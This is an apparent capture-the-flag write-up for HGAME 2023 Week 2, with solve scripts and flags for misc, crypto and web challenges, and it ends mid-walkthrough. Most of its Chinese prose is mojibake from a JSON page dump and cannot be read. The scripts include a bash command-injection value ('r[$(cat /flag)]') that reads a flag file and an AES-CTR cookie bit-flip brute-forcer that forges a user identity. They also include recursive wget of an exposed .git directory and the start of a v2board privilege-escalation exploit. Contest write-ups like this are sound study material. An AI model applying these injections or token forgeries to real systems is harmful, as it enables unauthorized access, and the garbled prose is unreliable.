æœ€åç”¨å®é™…å¯†æ–‡ä¸keyå¼‚æˆ–æ“ä½œè¿˜åŸæ˜æ–‡ï¼š 12345678910111213141516171819202122key = [ 0x4E, 0xA0, 0x37, 0x40, 0x46, 0x02, 0xDA, 0xFD, 0x21, 0xFA, 0x6E, 0x3C, 0xAF, 0xD9, 0x9C, 0xCF, 0xB9, 0x47, 0x33, 0x67, 0xE0, 0x4E, 0xEC, 0x0D, 0xD1, 0xC4, 0x80, 0x13, 0x32, 0xA9, 0xB2, 0x3A, 0xA7, 0x50, 0x5D, 0x02, 0x82, 0x39, 0x4A, 0x83]c = [ 0x28, 0x50, 0xC1, 0x23, 0x98, 0xA1, 0x41, 0x36, 0x4C, 0x31, 0xCB, 0x52, 0x90, 0xF1, 0xAC, 0xCC, 0x0F, 0x6C, 0x2A, 0x89, 0x7F, 0xDF, 0x11, 0x84, 0x7F, 0xE6, 0xA2, 0xE0, 0x59, 0xC7, 0xC5, 0x46, 0x5D, 0x29, 0x38, 0x93, 0xED, 0x15, 0x7A, 0xFF]flag = &#x27;&#x27;for i in range(0,len(c),4): flag += chr(c[i]^key[i+3]) + chr(c[i+1]^key[i+2]) + chr(c[i+2]^key[i+1]) + chr(c[i+3]^key[i])print(flag)# hgame&#123;Cpp_1s_much_m0r3_dlff1cult_th4n_C&#125;","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2023èµ›","slug":"2023èµ›","permalink":"https://lazzzaro.github.io/tags/2023%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"HGAME 2023 Week 2","slug":"match-HGAME-2023-Week-2","date":"2023-01-20T09:25:16.000Z","updated":"2023-01-20T11:58:46.830Z","comments":true,"path":"2023/01/20/match-HGAME-2023-Week-2/","permalink":"https://lazzzaro.github.io/2023/01/20/match-HGAME-2023-Week-2/","excerpt":"","text":"â€‹ HGAME 2023 å°†äº 1 æœˆ 5 æ—¥ 20:00 æ­£å¼å¼€å§‹ï¼Œç¥å¤§å®¶ç©å¾—å¼€å¿ƒ :-)çº¿ä¸Šèµ›å¹³å°ï¼šhttps://hgame.vidar.clubè¯·å°½å¿«æ³¨å†Œï¼Œæ³¨å†Œæ—¶è¯·é€‰æ‹©æ ¡å¤–é€‰æ‰‹ï¼Œæ³¨å†Œå°†äº 1 æœˆ 12 æ—¥ 20:00 å…³é—­æœ¬æ¬¡æ¯”èµ›çš„å¥–åŠ±äº‹å®œä»¥åŠèµ›åæ²Ÿé€šåé¦ˆä»¥é‚®ä»¶ä¸ºä¸»ï¼Œè¯·å„ä½ä½¿ç”¨çœŸå®çš„é‚®ä»¶åœ°å€æ¯”èµ›å¥–é‡‘(é’ˆå¯¹æ ¡å¤–æ¦œ)ï¼šç¬¬1åï¼š1000Pwnhubé‡‘å¸ç¬¬2åï¼š800Pwnhubé‡‘å¸ç¬¬3åï¼š600Pwnhubé‡‘å¸4-10åï¼š300Pwnhubé‡‘å¸è¡¥å……è¯´æ˜ï¼šæ’è¡Œæ¦œåˆ†æ•°ç›¸åŒè€…ï¼Œä»¥å…ˆè¾¾åˆ°è¯¥åˆ†æ•°çš„æ—¶é—´æ¬¡åºåˆ’å®šæ’åï¼Œæ¯ä½è·å¥–é€‰æ‰‹é¢å¤–èµ é€ Pwnhub é‚€è¯·ç ä¸€ä¸ªæ³¨æ„ï¼š* æ‰€æœ‰é€‰æ‰‹å‡ä»¥ä¸ªäººä¸ºå•ä½å‚èµ›ï¼›* åœ¨è§£é¢˜è¿‡ç¨‹ä¸­é‡åˆ°ç“¶é¢ˆæˆ–å›°éš¾å¯ä»¥ç§èŠå‡ºé¢˜äºº* ç¦æ­¢æ‰€æœ‰ç ´åæ¯”èµ›å…¬å¹³å…¬æ­£çš„è¡Œä¸ºï¼Œå¦‚ï¼šæ•£æ’­æˆ–ä¸å…¶ä»–äººäº¤æ¢ Flagã€è§£é¢˜æ€è·¯ï¼Œå¯¹å¹³å°ã€å‚èµ›è€…æˆ–å…¶ä»–äººå‘˜è¿›è¡Œæ”»å‡»ã€‚è¿è€…åˆ†æ•°ä½œåºŸå¹¶å–æ¶ˆæ¯”èµ›èµ„æ ¼ã€‚* HGAME çº¿ä¸Šèµ›åˆ†ä¸ºå››å‘¨ï¼Œæ¯å‘¨è‡³å®˜æ–¹wpå‘å¸ƒå‰å‰ç¦æ­¢ä¸€åˆ‡è®¨è®ºæœ¬å‘¨é¢˜ç›®ä»¥åŠå…¬å¼€è‡ªå·± wp çš„è¡Œä¸ºã€‚åœ¨æ”¶é›†å®Œæˆåä¼šå¼€æ”¾è®¨è®ºï¼Œä½†ä»…èƒ½è®¨è®ºå·²ç»“æŸçš„é¢˜ç›®ã€‚* æ¯å‘¨æ¯”èµ›ç»“æŸåæœ¬å‘¨å‰20åéœ€æäº¤wpåˆ°æŒ‡å®šé‚®ç®±æœ¬æ¯”èµ›æœ€ç»ˆè§£é‡Šæƒå½’ Vidar-Team æ‰€æœ‰ Rank: 8 â€‹ MiscTetris Master ä½ æ˜¯å¦å·²ç»åŒå€¦äº†æ™®é€šçš„æ¸¸æˆé¢˜ç›®ï¼Œå¯¹äºå†™è„šæœ¬ç©æ¸¸æˆæ„Ÿåˆ°æ— èŠï¼Ÿ æ­¤é¢˜ä½ éœ€è¦èƒ½å¤Ÿå®ç°RCEï¼Œæ‹¿åˆ°æ ¹ç›®å½•ä¸‹çš„flagï¼Œåˆæˆ–è€…ä½ æ˜¯çœŸæ­£çš„Tetris Masterï¼Ÿ è¯·ä½¿ç”¨sshè¿›è¡Œè¿æ¥ï¼Œè´¦å·ä¸ºctf,å¯†ç ä¸ºhgameï¼Œä¾‹å¦‚ssh ctf@week-2.hgame.lwsec.cn -p portã€‚å¹¶ä¸”ä½ éœ€è¦å°†ç»ˆç«¯çš„å­—ä½“è°ƒå°ï¼Œä½¿çª—å£å¤§å°è‡³å°‘ä¸º 200 * 70 æ‰èƒ½æ­£å¸¸è¿›è¡Œæ¸¸æˆã€‚ HINTS: é¢˜ç›®æè¿°å·²æ›´æ–°ï¼ŒåŒæ—¶ç”±äºå­˜åœ¨éé¢„æœŸï¼Œé¢˜ç›®åˆ†æ•°é™è‡³50,å¹¶ä¸Šçº¿100åˆ†çš„Revengeç‰ˆæœ¬ã€‚ è¿æ¥ï¼šssh ctf@week-2.hgame.lwsec.cn -p 32150 æŒ‰ Ctrl+C å¼ºåˆ¶ç»“æŸæ‹¿åˆ°shellï¼Œcat flag å¾—flagï¼šhgame&#123;Bash_Game^Also*Can#Rce&#125;ã€‚ â€‹ Tetris Master Revenge the same as Tetris Master bashå‘½ä»¤æ‰§è¡Œï¼Œå‚è€ƒByteCTF 2022 - bash_gameï¼Œåœ¨è¯»å…¥ target å€¼è¿›å…¥ paint_game_over() å†…ï¼Œæ¯”è¾ƒæ—¶ [[]] æ“ä½œç¬¦ä¼šé€ æˆRCEã€‚ 1234567891011121314paint_game_over() &#123; local xcent=$((`tput lines`/2)) ycent=$((`tput cols`/2)) local x=$((xcent-4)) y=$((ycent-25)) for (( i = 0; i &lt; 10; i++ )); do echo -ne &quot;\\033[$((x+i));$&#123;y&#125;H\\033[44m$&#123;good_game[$i]&#125;\\033[0m&quot;; done if [[ &quot;$master&quot; -eq &quot;y&quot; ]] &amp;&amp; [[ &quot;$score&quot; -gt 50000 ]]; then echo -ne &quot;\\033[$((x+3));$((ycent+1))H\\033[44m`cat /flag`\\033[0m&quot;; elif [[ &quot;$master&quot; -ne &quot;y&quot; ]] &amp;&amp; [[ &quot;$score&quot; -gt &quot;$target&quot; ]]; then echo -ne &quot;\\033[$((x+3));;$((ycent+1))H\\033[44mKeep Going\\033[0m&quot; else echo -ne &quot;\\033[$((x+3));$((ycent+1))H\\033[44m$&#123;score&#125;\\033[0m&quot;; fi&#125; sshè¿æ¥ï¼Œé€‰æ‹© nï¼Œè¾“å…¥ç›®æ ‡åˆ†æ•° r[$(cat /flag)]ï¼Œç¡®è®¤è¿›å…¥æ¸¸æˆï¼Œå¿«é€Ÿç»“æŸä¸€å±€ååœ¨ç»“æœå¤„ä»¥æŠ¥é”™å½¢å¼è¾“å‡ºflagï¼šhgame&#123;Bash_Game^Also*Can#Rce^reVenge!!!!&#125;ã€‚ â€‹ Sign In Pro Max å…”å…”æ²¡æœ‰æŠ¢åˆ°å›å®¶çš„è½¦ç¥¨ï¼Œä¸€ä¸ªçŒ«çŒ«å¤´åƒçš„å­¦é•¿ç»™äº†ä»–ä¸€ä¸ªå€™è¡¥è½¦ç¥¨æŠ¢ç¥¨è½¯ä»¶ï¼Œä½†æ˜¯è¿™ä¸ªè½¯ä»¶çš„éªŒè¯ç å¤ªéš¾äº†ï¼Œä½ èƒ½å¸®ä»–è§£ä¸€ä¸‹å—ï¼Ÿ flag è‹±æ–‡å­—æ¯ä¸ºå…¨å°å†™ï¼Œè‡ªè¡Œä½¿ç”¨ hgame{}åŒ…è£¹åæäº¤ äº”ä¸ªéƒ¨åˆ†ï¼š Part1ï¼šbase64+base58+base32ï¼Œå¾—åˆ° f51d3a18ï¼› Part2ï¼šmd5ï¼Œå¾—åˆ° f91cï¼› Part3ï¼šsha1ï¼Œå¾—åˆ° 4952ï¼› Part4ï¼šsha256ï¼Œå¾—åˆ° a3edï¼› Part5ï¼šrot21ï¼Œå¾—åˆ° Part5 is 0bc0ea61d21c, now put all the parts together, don&#39;t forget the format. æŒ‰UUIDæ ¼å¼è¿æ¥å¾—flagï¼š hgame&#123;f51d3a18-f91c-4952-a3ed-0bc0ea61d21c&#125;ã€‚ â€‹ crazy_qrcode å…”å…”åœ¨ä¹°å¹´è´§,ä½†æ˜¯çœ‹ç€å•†å®¶çš„ä»˜æ¬¾äºŒç»´ç çŠ¯äº†éš¾ pngå›¾ç‰‡çš„äºŒç»´ç æ— æ³•æ‰«æï¼Œä½¿ç”¨QRazyBoxå¯¼å…¥ï¼Œåˆ©ç”¨è‡ªå¸¦å·¥å…· Brute-force Format Info Pattern å¯ä»¥å¾—åˆ°ï¼š 1234Decoded Message :QDjkXkpM0BHNXujsError Correction Level : HMask Pattern : 4 ä½¿ç”¨ QDjkXkpM0BHNXujs è§£å‹zipå‹ç¼©åŒ…ï¼Œå¾—åˆ°25å¼ åˆ†å‰²çš„äºŒç»´ç å›¾ç‰‡ï¼Œä»¥åŠä¸€ä¸ª25é•¿åº¦çš„æ•°ç»„ã€‚ 1ä¸º90Â°æ—‹è½¬ï¼Œ2ä¸º180Â°æ—‹è½¬ï¼Œ3ä¸º270Â°æ—‹è½¬ï¼Œ0ä¸ºä¸æ—‹è½¬ï¼Œ?ä¸ºéœ€é€‰æ‹©å…¶ä¸­ä¸€ä¸ªå€¼è°ƒæ•´ã€‚ æŒ‰ç…§5Ã—5æ‹¼æ¥å¥½åæ‰«æå¾—åˆ°flagï¼šhgame&#123;Cr42y_qrc0de&#125;ã€‚ â€‹ CryptoRabin çœ‹èµ·æ¥éå¸¸åƒRSAå‘¢ã€‚ 1234567891011121314151617181920212223&gt;from Crypto.Util.number import *def gen_key(kbits): while True: p = getPrime(kbits) q = getPrime(kbits) if p % 4 == 3 and q % 4== 3: break return p, qp ,q = gen_key(256) flag = open(&quot;flag&quot;, &#x27;rb&#x27;).read() pt = bytes_to_long(flag) c = pow(pt, 2, p*q) print(f&quot;p=&#123;p&#125;\\nq=&#123;q&#125;&quot;) print(f&quot;c=&#123;hex(c)[2:]&#125;&quot;) &quot;&quot;&quot;p=65428327184555679690730137432886407240184329534772421373193521144693375074983q=98570810268705084987524975482323456006480531917292601799256241458681800554123 c=4e072f435cbffbd3520a283b3944ac988b98fb19e723d1bd02ad7e58d9f01b26d622edea5ee538b2f603d5bf785b0427de27ad5c76c656dbd9435d3a4a7cf556 &quot;&quot;&quot; $e=2$ï¼ŒRabinç®—æ³•è§£RSAã€‚ 12345678910111213141516171819202122232425import gmpy2def rabin_decrypt(c, p, q, e=2): n = p * q mp = pow(c, (p + 1) // 4, p) mq = pow(c, (q + 1) // 4, q) yp = gmpy2.invert(p, q) yq = gmpy2.invert(q, p) r = (yp * p * mq + yq * q * mp) % n rr = n - r s = (yp * p * mq - yq * q * mp) % n ss = n - s return (r, rr, s, ss) p = 65428327184555679690730137432886407240184329534772421373193521144693375074983q = 98570810268705084987524975482323456006480531917292601799256241458681800554123c = 0x4e072f435cbffbd3520a283b3944ac988b98fb19e723d1bd02ad7e58d9f01b26d622edea5ee538b2f603d5bf785b0427de27ad5c76c656dbd9435d3a4a7cf556m = rabin_decrypt(c,p,q)for i in range(4): try: print(bytes.fromhex(hex(m[i])[2:])) except: pass # b&#x27;hgame&#123;That&#x27;5_s0_3asy_to_s@lve_r@bin&#125;&#x27; â€‹ RSA å¤§å†’é™©1 é©¬ä¸Šè¦è¿‡å¹´å–½ï¼Œå…”å…”å¼€å¿ƒåœ°å»è¶…å¸‚ä¹°å¹´è´§ï¼Œä½†æ˜¯è¶…å¸‚é—¨å£å´å†™ç€â€åªæœ‰å®ŒæˆæŒ‘æˆ˜æ‰èƒ½è¿›å…¥è¶…å¸‚â€ï¼Œä½ èƒ½å¸®å¸®å…”å…”å— 123456789101112131415161718192021# challenge1.pyfrom Crypto.Util.number import *from challenges import chall1_secretclass RSAServe: def __init__(self) -&gt; None: self.e = 65537 self.p = getPrime(128) self.q = getPrime(100) self.r = getPrime(100) self.m = chall1_secret def encrypt(self): m_ = bytes_to_long(self.m) c = pow(m_, self.e, self.p*self.q*self.r) return hex(c) def check(self, msg): return msg == self.m def pubkey(self): return self.p*self.q*self.r, self.e, self.p 12345678910111213141516171819202122# challenge2.pyfrom Crypto.Util.number import *from challenges import chall2_secretclass RSAServe: def __init__(self) -&gt; None: self.p = getPrime(512) self.q = getPrime(512) self.e = 65537 self.m = chall2_secret def encrypt(self): m_ = bytes_to_long(self.m) c = pow(m_ ,self.e, self.p*self.q) self.q = getPrime(512) return hex(c) def check(self, msg): return msg == self.m def pubkey(self): return self.p*self.q, self.e 123456789101112131415161718192021# challenge3.pyfrom Crypto.Util.number import *from challenges import chall3_secretclass RSAServe: def __init__(self) -&gt; None: self.p = getPrime(512) self.q = getPrime(512) self.e = 3 self.m = chall3_secret def encrypt(self): m_ = bytes_to_long(self.m) c = pow(m_, self.e, self.p*self.q) return hex(c) def check(self, msg): return msg == self.m def pubkey(self): return self.p*self.q, self.e 12345678910111213141516171819202122# challenge4.pyfrom Crypto.Util.number import *from challenges import chall4_secretclass RSAServe: def __init__(self) -&gt; None: self.p = getPrime(512) self.q = getPrime(512) self.e = getPrime(17) self.m = chall4_secret def encrypt(self): m_ = bytes_to_long(self.m) c = pow(m_, self.e, self.p*self.q) self.e = getPrime(17) return hex(c) def check(self, msg): return msg == self.m def pubkey(self): return self.p*self.q, self.e æ±‚è§£å››å±‚RSAæ‹¿flagã€‚ ç¬¬ä¸€å±‚ï¼Œ$m&lt;p$ï¼Œæ— éœ€å®Œå…¨åˆ†è§£ $n$ã€‚ 12345678n = 322341817140424854310546430443927118765748131714269745607168549026570389299661764844365062948036437e = 65537p = 304198953434620851532952216290120837853c = 0x22ca52bc2ed70d7133a0916529d73ed1e91f36f6d7d7118d40de0cdae89c692d637a28727a4b90077dd = inverse_mod(e,p-1)m = int(pow(c%p,d,p))print(bytes.fromhex(hex(m)[2:]))# b&#x27;m&lt;n_But_also_m&lt;p&#x27; ç¬¬äºŒå±‚ï¼Œ$\\gcd(n1,n2)=p$ï¼Œäº¤äº’ä¸¤æ¬¡æ•°æ®ã€‚ 123456789101112n1 = 85985649208163776168434106703299680942043569819886697084537149593016735251489437349033723731635167019919946528408991797589149306964593269240843489773393816361050438737217630268220265477449408440087731905143882172966401806119978492409284761350964437389319354732032636067387214869765942537900408255046554977317c1 = 0x75124a122559d227bb846448b401877c86e7ac67dc5a1329622a6b54bbae91d3bc5a9afb859d86d90ac24cdd76cc7fa0763be082d9aa9f0c487d44f7a0725d6f195d6168837468c505f92dd1da29b618e3de01292a9592a1b2ce3d4dcdc4cad202c3c1fe190bb2469cf401b1a2fef29b8e487db908f30085e262ef84e6501118n2 = 59612565629569243187927748458601473421039478282275869456898180179757129074951912462324655640636883153553671190318605493897644967308094259008273993958933708638671942944003571666749098289527528628582925016986696150709641914606485011406578947680624107267500302631283661241951979431008098395802457051450378936263c2 = 0x23db0d9129161ba5318a43bf18db2ac276faa8e6f75b9a48250dbbc04de5b6a67764f8f8917f3f11e4b7308d7563f262500abcc59f0dc44bdc20d438e9ad424dbf7b7187b6cab4eeb5b32fdeb800e8dd6afcea3f97d97bac3be5a5fe9fbb06717dbf43f68cf0f91754e4f89e9a606b21c1467d3b8a7a0ed10e40f3bfb1e81a6ae = 65537p = gcd(n1,n2)q1 = n1//pf = (p-1)*(q1-1)d = inverse_mod(e,f)m = pow(c1,d,n1)print(bytes.fromhex(hex(m)[2:]))#b&#x27;make_all_modulus_independent&#x27; ç¬¬ä¸‰å±‚ï¼Œ$e=3$ï¼Œ$m^e \\lt n$ï¼Œå° $e$ æ”»å‡»ã€‚ 1234567import gmpy2n = 62704397894391666479295080309251941192000653454396729807060395416391202444260383706554703418832720336900862424454646857290291688832249601582850489926515630514103107259941315796861595330414857499788329730467181727640390968106751789752583882632594974153970877867469382083206724358855594117005793286924964786309e = 3c = 0xfec61958cefda3eb5f709faa0282bffaded0a323fe1ef370e05ed3744a2e53b55bdd43e9594427c35514505f26e4691ba86c6dcff6d29d69110b15b9f84b0d8eb9ea7c03aaf24fa957314b89febf46a615f81ec031b12fe725f91af9d269873a69748m = gmpy2.iroot(c,e)[0]print(bytes.fromhex(hex(m)[2:]))#b&#x27;encrypt_exponent_should_be_bigger&#x27; ç¬¬å››å±‚ï¼Œå…±æ¨¡æ”»å‡»ï¼Œäº¤äº’ä¸¤æ¬¡æ•°æ®ã€‚ 123456789101112131415161718192021222324252627import gmpy2 as gpdef egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)n = 95910070679089754882020609736361209978330742771232029437332648538529286081128112666433856280432204891053831926879516053786710256434719058164494668021689267490579582989448124586518700994273232858281123929454653035358779110102882528619796861827968986375140987711988221162025924201304147782787221328299013679367e1 = 81919c1 = 0x1d884ae280842f2c9f26fd4ec97d3e4d8d58cbe2ec0420f2179451663b873989d9dac3d796f6be72c982f82cd96dc346620c7028e48d0059acaa0242b36646c82e08a3e327ca0e2ee5f5cba574ad02953f3302963cd75760ea6bb5d8bc955b0b3d1c4f885d20cb8bb2d720331cba9fb0fb6a433e2b1f1ac588cf820be4169adde2 = 108041c2 = 0x69bd0266cd0c825ea1ac562385bb42be7040e1002e31f73c4139127577aa1d9d2a5cc05236bf03afb126202609e9fecc717bd229145bc7c5972a05476a8b66b8be1740f4f468ac24e9d8ed3ed5836a537aed77ad910bbb185a0421ed9faf97776e128058563ef0520e9fdf6ad47408da86ed02ab46761b962f8f34750c3791e1s = egcd(e1, e2)s1 = s[1]s2 = s[2]if s1&lt;0: s1 = - s1 c1 = gp.invert(c1, n)elif s2&lt;0: s2 = - s2 c2 = gp.invert(c2, n)m = pow(c1,s1,n)*pow(c2,s2,n) % nprint(bytes.fromhex(hex(m)[2:]))#b&#x27;never_uese_same_modulus&#x27; å››æ¬¡æäº¤æ­£ç¡®å¾—flagï¼šhgame&#123;W0w_you^knowT^e_CoMm0n_&amp;t$ack_@bout|RSA&#125;ã€‚ â€‹ åŒ…é‡Œæœ‰ä»€ä¹ˆ å…”å…”æ”¶åˆ°äº†ä¸€åŒ…å¹´è´§ï¼Œä½†æ˜¯ä»–å¿˜äº†é‡Œé¢æœ‰ä»€ä¹ˆäº†ã€‚ 1234567891011121314151617181920212223242526from random import randintfrom libnum import gcd, s2nfrom secret import flagplain = flag[6:-1]assert flag == &#x27;hgame&#123;&#x27; + plain + &#x27;&#125;&#x27;v = bin(s2n(plain))[2:]l = len(v)a = [2 &lt;&lt; i for i in range(l)]m = randint(sum(a), 2 &lt;&lt; l + 1)w = randint(0, m)assert gcd(w, m) == 1b = [w * i % m for i in a]c = 0for i in range(l): c += b[i] * int(v[i])print(f&#x27;m = &#123;m&#125;&#x27;)print(f&#x27;b0 = &#123;b[0]&#125;&#x27;)print(f&#x27;c = &#123;c&#125;&#x27;)# m = 1528637222531038332958694965114330415773896571891017629493424# b0 = 69356606533325456520968776034730214585110536932989313137926# c = 93602062133487361151420753057739397161734651609786598765462162 å…ˆåˆ©ç”¨ $b_0$ æ±‚ $w$ï¼Œå†è§£èƒŒåŒ…å¯†ç ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647m = 1528637222531038332958694965114330415773896571891017629493424b0 = 69356606533325456520968776034730214585110536932989313137926c = 93602062133487361151420753057739397161734651609786598765462162w = b0//2# é¢„ä¼°é•¿åº¦for k in range(3): l = m.nbits() - k a = [2 &lt;&lt; i for i in range(l)] b = [w * i % m for i in a] pk = b ct = c n = len(pk) M = Matrix.identity(n) * 2 last_row = [1 for x in pk] M_last_row = Matrix(ZZ, 1, len(last_row), last_row) last_col = pk last_col.append(ct) M_last_col = Matrix(ZZ, len(last_col), 1, last_col) M = M.stack(M_last_row) M = M.augment(M_last_col) X = M.BKZ() sol = [] for i in range(n + 1): testrow = X.row(i).list()[:-1] if set(testrow).issubset([-1, 1]): for v in testrow: if v == 1: sol.append(0) elif v == -1: sol.append(1) break s = bytes.fromhex(hex(int(&#x27;&#x27;.join(map(str,sol)),2))[2:]) print(s) # b&#x27;:/b2\\x83.F\\x832z2\\x1a\\x82v&#123;\\x1a\\x82Z2G&quot;\\x82Z/\\x03&#x27;# b&#x27;b\\xe8N\\xe6\\xbeh\\xdc\\xbef\\xc2\\xe6\\xf2\\xbe\\xc4\\xc2r\\xbe\\xd2\\xe6\\xdcn\\xbe\\xd2\\xe8~&#x27;# b&quot;1t&#x27;s_4n_3asy_ba9_isn7_it?&quot; â€‹ é›¶å…ƒè´­å¹´è´§å•†åº— å¬è¯´å…”å…”è¦ä¹°å¹´è´§ï¼Œæ­£å¥½æç“¦ç‰¹å¤§é™†çš„ç’ƒæœˆæµ·ç¯èŠ‚ä¹Ÿè¦åˆ°äº†ï¼Œtr0ubleç‰¹åœ°ä¸ºå…”å…”å‡†å¤‡äº†ä¸€ä»½flagå¤§ç¤¼ã€‚å—¯ï¼Œä½ ä¹Ÿæƒ³è¦ï¼Ÿä¸å¯ä»¥å“¦ã€‚ router/router.go é‡Œä¸»è¦é€»è¾‘ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950func loginController(c *gin.Context) &#123; _, err := c.Cookie(&quot;token&quot;) if err == nil &#123; c.Redirect(http.StatusFound, &quot;/home&quot;) &#125; userName := c.PostForm(&quot;username&quot;) if userName == &quot;Vidar-Tu&quot; &#123; c.String(http.StatusForbidden, &quot;å…”å…”æ‰ä¸å¯èƒ½æ˜¯ä½ å‘¢ï¼ï¼&quot;) &#125; User := user.User&#123;Name: userName, Created: time.Now().Unix(), Uid: &quot;230555433&quot;&#125; jsonUser, _ := json.Marshal(User) token, _ := util.Encrypt(string(jsonUser)) c.SetCookie(&quot;token&quot;, token, 3600, &quot;/&quot;, &quot;&quot;, false, true) c.Redirect(http.StatusFound, &quot;/home&quot;)&#125;func buyController(c *gin.Context) &#123; method := c.Request.Method token, err := c.Cookie(&quot;token&quot;) if err != nil &#123; c.String(http.StatusForbidden, &quot;æ²¡æœ‰èº«ä»½çš„äººå¯ä¸èƒ½æ¥è¿™å„¿ä¹°ä¸œè¥¿ã€‚&quot;) &#125; jsonUser, err := util.Decrypt(token) if err != nil &#123; c.String(http.StatusBadGateway, err.Error()) &#125; User := user.User&#123;&#125; err = json.Unmarshal([]byte(jsonUser), &amp;User) if err != nil &#123; c.String(http.StatusBadGateway, err.Error()) &#125; name := User.Name if method != http.MethodGet &#123; c.String(http.StatusMethodNotAllowed, fmt.Sprintf(&quot;your method: %s. but only get method allowed&quot;, method)) &#125; else &#123; product := c.Query(&quot;prod&quot;) if product == &quot;flag&quot; &#123; if name != &quot;Vidar-Tu&quot; &#123; c.String(http.StatusOK, &quot;flag å¯æ˜¯ç‰¹åœ°ä¸ºå…”å…”å‡†å¤‡çš„ï¼&quot;) &#125; else &#123; file, _ := os.Open(&quot;flag.txt&quot;) flag, _ := io.ReadAll(file) c.String(http.StatusOK, fmt.Sprintf(&quot;%s buy %s successfully\\n%s&quot;, name, product, flag)) &#125; &#125; else &#123; c.String(http.StatusOK, fmt.Sprintf(&quot;%s buy %s successfully&quot;, name, product)) &#125; &#125;&#125; éœ€è¦tokené‡ŒuserNameå€¼ä¸º Vidar-Tuï¼Œä½†ä¸èƒ½ç›´æ¥è¾“å…¥ Vidar-Tuã€‚ æŸ¥çœ‹ util/util.go é‡Œï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041package utilimport ( &quot;crypto/aes&quot; &quot;crypto/cipher&quot; &quot;crypto/rand&quot; &quot;encoding/base64&quot; &quot;errors&quot;)var key = make([]byte, 16)var iv = make([]byte, 16)func init() &#123; _, _ = rand.Read(key) _, _ = rand.Read(iv)&#125;func Encrypt(u string) (string, error) &#123; block, err := aes.NewCipher(key) if err != nil &#123; return &quot;&quot;, err &#125; plainText := []byte(u) blockMode := cipher.NewCTR(block, iv) cipherText := make([]byte, len(plainText)) blockMode.XORKeyStream(cipherText, plainText) return base64.StdEncoding.EncodeToString(cipherText), nil&#125;func Decrypt(cipherText string) (string, error) &#123; decodeData, err := base64.StdEncoding.DecodeString(cipherText) if err != nil &#123; return &quot;&quot;, errors.New(&quot;invalid base64&quot;) &#125; block, err := aes.NewCipher(key) blockMode := cipher.NewCTR(block, iv) plainText := make([]byte, len(decodeData)) blockMode.XORKeyStream(plainText, decodeData) return string(plainText), nil&#125; tokençš„ä½¿ç”¨AES-CTRæ¨¡å¼åŠ å¯†ç”Ÿæˆï¼Œè€Œåœ¨CTRæ¨¡å¼ä¸­ï¼Œ æœ‰ä¸€ä¸ªè‡ªå¢çš„ç®—å­ï¼ˆIVï¼Œåå››ä¸ªå­—èŠ‚ç›¸å½“äºè®¡æ•°å™¨ï¼Œæ¯æ¬¡è®¡ç®—é€’å¢ï¼‰ï¼Œè¿™ä¸ªç®—å­ç”¨å¯†é’¥åŠ å¯†ä¹‹åçš„è¾“å‡ºå’Œæ˜æ–‡å¼‚æˆ–çš„ç»“æœå¾—åˆ°å¯†æ–‡ï¼Œç›¸å½“äºä¸€æ¬¡ä¸€å¯†ï¼Œå³ $m \\oplus \\text{keystream} = c$ã€‚ ç”¨æˆ·åå’Œtokenä¸ºä¸€ä¸€å¯¹åº”å…³ç³»ï¼Œè¾“å…¥ Vidar-Tv å’Œ Vidar-Tw è·å–å¯¹åº”tokençš„base64å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°æ”¹å˜çš„å­—ç¬¦ï¼Œçˆ†ç ´ï¼š 123456789101112131415import requestsimport stringfrom urllib.parse import quotes = requests.Session()dic = string.ascii_letters+string.digits+&#x27;+/&#x27;for k in dic: token = f&#x27;NnL3arZc7tt+ezcky+B8fF&#123;k&#125;75UtdWR6yUOD2rbYBBnIFPp1Rl/HXFxRPBwNeTzi2R2Wm5AVZQRwt+A==&#x27; url = &#x27;http://week-2.hgame.lwsec.cn:30036/buy?prod=firecracker&#x27; r = s.get(url, cookies=&#123;&#x27;token&#x27;:quote(token)&#125;) if &#x27;Vidar-Tu&#x27; in r.text: print(k,quote(token),r.text) # 6 NnL3arZc7tt%2Bezcky%2BB8fF675UtdWR6yUOD2rbYBBnIFPp1Rl/HXFxRPBwNeTzi2R2Wm5AVZQRwt%2BA%3D%3D Vidar-Tu buy firecracker successfully ä¿®æ”¹cookieä¸­çš„tokenï¼Œè´­ä¹°flagï¼Œå¾—åˆ°flagï¼šhgame&#123;5o_Eas9_6yte_flip_@t7ack_wi4h_4ES-CTR&#125;ã€‚ â€‹ WebGit Leakage ç”µè§†å‰§é‡Œçš„é»‘å®¢?çœŸæ­£çš„é»‘å®¢ï¼ é¢˜ç›®å³æç¤ºï¼Œgitæ³„éœ²ã€‚ è®¿é—® http://HOST:PORT/.git/ï¼Œä½¿ç”¨wgetä¸‹è½½gitç›®å½•ï¼š wget -r http://week-2.hgame.lwsec.cn:31765/.git/ è¿›å…¥ .git/logsï¼Œä½¿ç”¨ git reflog æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯çš„æ‰€æœ‰æ“ä½œè®°å½•ï¼ˆåŒ…æ‹¬å·²ç»è¢«åˆ é™¤çš„ commit è®°å½•å’Œ reset çš„æ“ä½œï¼‰ï¼› é€‰æ‹©éœ€è¦æŸ¥çœ‹çš„è®°å½•ï¼Œgit show 1dd69e2 æ‹¿åˆ°flagï¼šhgame&#123;Don&#39;t^put*Git-in_web_directory&#125;ã€‚ â€‹ v2board è¯·å°è¯•è·å–Adminç”¨æˆ·çš„è®¢é˜…é“¾æ¥ï¼Œflagæ ¼å¼ä¸ºhgame{adminç”¨æˆ·è®¢é˜…é“¾æ¥ä¸­çš„tokenå€¼}ã€‚ v2boardå­˜åœ¨è¶Šæƒæ¼æ´ï¼Œå‚è€ƒv2boardè¶Šæƒæ¼æ´å¤ç°ã€‚ é¦–å…ˆæ³¨å†Œä¸€ä¸ªæ™®é€šç”¨æˆ·è´¦å·ï¼Œç„¶åé€šè¿‡ http://HOST:PORT/api/v1/passport/auth/login æ¥å£ç™»å½•è¯¥è´¦å·ï¼Œä¼šè¿”å›ä¸€ä¸ª auth_data å€¼ï¼› ç„¶åè®¿é—® http://HOST:PORT/api/v1/user/login æ¥å£ï¼Œå¹¶å°†ä¸Šè¿°è·å¾—çš„ auth_data 